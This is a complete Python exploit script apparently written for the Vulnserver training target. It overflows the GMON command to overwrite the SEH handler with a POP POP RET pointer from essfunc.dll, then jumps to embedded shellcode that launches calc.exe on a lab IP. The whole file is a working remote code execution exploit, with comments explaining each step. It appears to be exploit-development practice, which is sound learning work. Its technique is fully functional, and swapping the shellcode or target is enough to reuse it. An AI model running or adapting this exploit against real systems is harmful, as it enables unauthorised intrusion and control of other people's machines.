#!/usr/bin/python
import socket,sys,struct

RHOST = "192.168.57.144" # Remote IP
RPORT = 9999 # Remote port

buf_totlen = 4000 # Total length of buffer (payload)

offset_nseh = 3495 # Offset to overwrite address of mem. addr. of nSEH; Op. codes go here
offset_seh = 3499 # Offset to overwrite address of SEH; Mem. addr. to POP POP RET goes here

ptr_pop_pop_ret = 0x6250172B # "pop edi# pop ebp# ret" in essfunc.dll
jmp_short_6 = "\xeb\x06\x90\x90" # Op. code for 'jmp short 6'; Jumps over \x90\x90 & offset_seh
add_esp_107 = "\x83\xc4\x6b" # Op. code for 'add esp,107'; Moves ESP to ptr. to mem. addr. within buf
ret = "\xc3" # Op. code for 'ret'; Returns to address in ESP

# From: WinExec-calc.nasm
# WinExec(LPCSTR "cmd.exe /c calc.exe", UINT 0)
# ExitProcess(UINT 0)
calc = ""
calc += "\xeb\x17\x5e\x31\xd2\x52\x88\x56" 
calc += "\x13\x56\xb8\xad\x23\x86\x7c\xff"
calc += "\xd0\x52\xb8\xe8\xc0\x80\x7c\xff"
calc += "\xd0\xe8\xe4\xff\xff\xff\x63\x6d"
calc += "\x64\x2e\x65\x78\x65\x20\x2f\x63"
calc += "\x20\x63\x61\x6c\x63\x2e\x65\x78"
calc += "\x65\x4e"

buf = ""
buf += "\x90" * (offset_nseh - len(calc)) # Fills to offset_nseh - len(calc) with 'NOP'; 'RET' lands here
buf += calc # Payload of calc.exe; Located just before offset_nseh
buf += jmp_short_6 # Overwrites memory address of nSEH with Op. codes for 'jmp short 6'
buf += struct.pack("<I", ptr_pop_pop_ret) ; # Overwrites SEH with ptr. to 'PPR'; 'RET' to nSEH addr.
buf += add_esp_107 * 4 # Moves ESP to location which points to mem. addr. within controlled buffer
buf += ret # Returns to address in ESP which points to mem. addr. within controlled buffer
buf += "\x90" * (buf_totlen - len(buf)) # Fills rest of buffer with 'NOP'

print("Buffer length: " + str(len(buf)))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

s.send("GMON /.:/" + buf)
s.close()

